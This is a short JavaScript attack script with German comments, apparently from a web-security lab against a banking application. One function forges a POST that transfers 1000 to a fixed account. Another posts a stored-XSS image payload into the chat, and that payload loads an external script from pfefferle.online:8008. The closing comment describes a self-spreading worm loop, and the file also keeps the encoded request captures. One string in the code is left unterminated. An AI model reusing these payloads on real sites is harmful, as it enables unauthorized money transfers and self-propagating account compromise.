console.log('still works');

// Überweisung ausführen
(function(){ // anonyme, selbstausführende Funktion
    var x = new XMLHttpRequest();
    x.open('POST', '/banking/?page=transfer2');
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.send('account=8030098&amount=1000&intended_use=&receiver=');
})();


// sich selbst in den Chat schreiben
(function(){ // anonyme, selbstausführende Funktion
    var x = new XMLHttpRequest();
    var payload =  "\\u003cimg+src=\\u0022data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\\u0022+onload=\\u0022script+=+document.createElement('script');script.src+='http://pfefferle.online:8008/f.js';document.head.appendChild(script);\\u0022\\u003e";
    x.open('POST', '/banking/?page=chat');
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.send('name=&message=' + encodeURIComponent(payload) + '&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden
})();

//req orig ff:
//name=&message=%5Cu003cimg+src%3D%5Cu0022data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAAALAAAAAABAAEAAAIBRAA7%5Cu0022+onload%3D%5Cu0022script+%3D+document.createElement%28%27script%27%29%3Bscript.src+%3D%27http%3A%2F%2Fpfefferle.online%3A8008%2Ff.js%27%3Bdocument.head.appendChild%28script%29%3B%5Cu0022%5Cu003e&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden

/*req :
name=
    &message=%5Cu003cimg+src%3D%5Cu0022data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAAALAAAAAABAAEAAAIBRAA7%5Cu0022+onload%3D%5Cu0022script+%3D+document.createElement%28%27script%27%29%3Bscript.src+%3D%27http%3A%2F%2Fpfefferle.online%3A8008%2Ff.js%27%3Bdocument.head.appendChild%28script%29%3B%5Cu0022%5Cu003e
    &key=SusiAndPinhead4EverAndEverAndEver
    &sendto_me=absenden

req xhr:
key=SusiAndPinhead4EverAndEverAndEver&message=%3Cimg%2Bsrc%3D%22data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAAALAAAAAABAAEAAAIBRAA7%22%2Bonload%3D%22script%2B%3D%2Bdocument.createElement('script')%3Bscript.src%2B%3D'http%3A%2F%2Fpfefferle.online%3A8008%2Ff.js'%3Bdocument.head.appendChild(script)%3B%22%3E&name=sendto_me=absenden
*/

// inj -> chat -> memo -> läd bei aufruf ext script -> inj -> chat -> memo -> läd
